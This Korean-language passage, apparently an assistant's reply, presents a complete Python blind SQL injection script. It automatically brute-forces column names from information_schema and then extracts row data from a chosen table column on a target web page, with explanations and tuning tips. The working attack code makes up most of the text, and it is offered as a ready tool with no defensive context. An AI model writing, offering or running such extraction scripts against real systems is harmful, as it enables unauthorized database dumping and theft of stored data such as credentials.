테이블의 컬럼 데이터를 추출하는 스크립트는 앞서 설명한 Blind SQL Injection 방식의 확장된 형태로 구현할 수 있습니다. 이미 테이블 이름을 추출하는 방식과 유사하게, information_schema.columns 테이블을 통해 컬럼 이름을 추출한 다음, 각 컬럼의 데이터를 추출할 수 있습니다.

이를 위해 다음과 같은 단계로 스크립트를 작성할 수 있습니다:

1. 특정 테이블의 컬럼 이름 추출


2. 컬럼에서 데이터 추출



다음은 테이블의 컬럼 이름을 먼저 추출한 후, 해당 컬럼의 데이터를 추출하는 파이썬 스크립트입니다.

1. 특정 테이블의 컬럼 이름 추출

2. 해당 컬럼의 데이터를 추출

import requests

# 대상 URL 설정
url = "http://example.com/vulnerable_page.php"  # 테스트할 대상 URL
param_name = "id"  # 공격할 파라미터 이름 (예: id)

# 참/거짓 판별을 위한 응답의 키워드
true_response_indicator = "Welcome"  # 참일 때 나타나는 응답 내용 (사용자 환경에 맞게 수정)

# 참/거짓 판별 함수
def is_true_response(response):
    return true_response_indicator in response.text

# 테이블의 컬럼 이름 추출 함수
def find_column_names(table_name):
    column_names = []
    for index in range(0, 100):  # 최대 100개의 컬럼을 가정
        column_name = ""
        for i in range(1, 50):  # 컬럼 이름의 최대 길이를 50자로 가정
            for char_code in range(32, 127):  # ASCII 코드 범위 탐색 (32~126)
                payload = f"' OR (SELECT ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT {index},1),{i},1)))={char_code}--"
                params = {param_name: payload}
                response = requests.get(url, params=params)

                if is_true_response(response):
                    column_name += chr(char_code)
                    print(f"[+] Found character: {chr(char_code)} at position {i} for column {index + 1}")
                    break

            if char_code == 126 and len(column_name) == i - 1:
                break

        if column_name:
            print(f"[+] Column {index + 1} name: {column_name}")
            column_names.append(column_name)
        else:
            break
    return column_names

# 특정 컬럼에서 데이터 추출 함수
def find_column_data(table_name, column_name):
    column_data = []
    for index in range(0, 100):  # 최대 100개의 데이터 행을 가정
        row_data = ""
        for i in range(1, 50):  # 데이터의 최대 길이를 50자로 가정
            for char_code in range(32, 127):  # ASCII 코드 범위 탐색 (32~126)
                payload = f"' OR (SELECT ASCII(SUBSTRING((SELECT {column_name} FROM {table_name} LIMIT {index},1),{i},1)))={char_code}--"
                params = {param_name: payload}
                response = requests.get(url, params=params)

                if is_true_response(response):
                    row_data += chr(char_code)
                    print(f"[+] Found character: {chr(char_code)} at position {i} for row {index + 1}")
                    break

            if char_code == 126 and len(row_data) == i - 1:
                break

        if row_data:
            print(f"[+] Row {index + 1} data: {row_data}")
            column_data.append(row_data)
        else:
            break
    return column_data

# 메인 실행 함수
if __name__ == "__main__":
    # 1. 테이블 이름 입력
    table_name = input("Enter the table name: ")

    # 2. 해당 테이블의 컬럼 이름 추출
    print(f"[INFO] Extracting column names for table: {table_name}")
    column_names = find_column_names(table_name)

    if column_names:
        print(f"[+] Found column names: {column_names}")

        # 3. 사용자가 추출할 컬럼을 선택
        column_name = input(f"Enter the column name from {column_names}: ")

        if column_name in column_names:
            # 4. 해당 컬럼의 데이터 추출
            print(f"[INFO] Extracting data for column: {column_name}")
            column_data = find_column_data(table_name, column_name)
            print(f"[+] Extracted data: {column_data}")
        else:
            print("[-] Invalid column name.")
    else:
        print("[-] Could not find any column names.")

설명:

1. 컬럼 이름 추출 (find_column_names()):

주어진 테이블 이름에서 컬럼 이름을 추출합니다. information_schema.columns에서 특정 테이블에 속한 컬럼의 이름을 가져옵니다.

SUBSTRING()과 ASCII() 함수를 사용하여 하나씩 문자를 확인하면서 컬럼 이름을 추출합니다.



2. 컬럼 데이터 추출 (find_column_data()):

특정 테이블의 컬럼 데이터를 추출하는 함수입니다. SELECT {column_name} FROM {table_name} 구문을 사용하여 각 데이터 행을 하나씩 추출합니다.

마찬가지로 SUBSTRING()과 ASCII() 함수로 데이터를 추출합니다.



3. 사용자 입력 처리:

사용자가 추출하고자 하는 테이블 이름과 컬럼 이름을 입력하게 하여, 그에 맞춰 데이터를 추출합니다.




실행 순서:

1. 테이블 이름 입력: 사용자가 테이블 이름을 입력합니다.


2. 컬럼 이름 추출: 해당 테이블에서 컬럼 이름을 추출합니다.


3. 컬럼 이름 선택: 추출된 컬럼 이름 중 하나를 선택합니다.


4. 컬럼 데이터 추출: 선택된 컬럼에서 데이터 행을 하나씩 추출하여 출력합니다.



주의사항:

응답 판별 기준: 응답에서 참(True)인 응답을 판별하는 키워드는 사용자의 환경에 맞게 수정해야 합니다. 예시에서는 "Welcome"을 사용했으나, 실제 환경에 맞게 응답의 특성을 파악하고 수정해야 합니다.

데이터 개수와 길이: 테이블의 데이터가 많을 경우, 최대 개수(100개)를 조정하여 테스트해야 합니다.


확장 가능성:

이 스크립트는 특정 컬럼의 데이터를 추출할 수 있으므로, 이를 확장하여 여러 컬럼의 데이터를 동시에 추출하거나, 조건부 데이터 검색 기능을 추가할 수 있습니다.


이 스크립트는 Blind SQL Injection을 통해 테이블의 컬럼 이름과 데이터를 자동으로 추출하는 강력한 도구가 될 수 있습니다.

